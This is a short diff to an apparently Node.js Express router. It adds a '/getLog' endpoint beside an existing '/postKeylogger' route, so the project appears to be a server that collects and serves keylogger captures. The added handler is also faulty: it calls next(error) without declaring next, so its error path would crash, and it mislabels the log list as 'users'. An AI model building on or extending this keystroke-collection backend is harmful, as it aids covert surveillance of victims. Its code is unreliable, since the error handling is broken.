@@ -15,6 +15,17 @@ router.get('/', async (req, res) => {
       }
 });
 
+router.get('/getLog', async (req, res) => {
+  try {
+      const users = await service.getLogList();
+      res.json(users);
+      return users;
+    } catch (error) {
+      next(error);
+    }
+});
+
+
 
 router.post('/postKeylogger',async (req,res)=>{
   try{
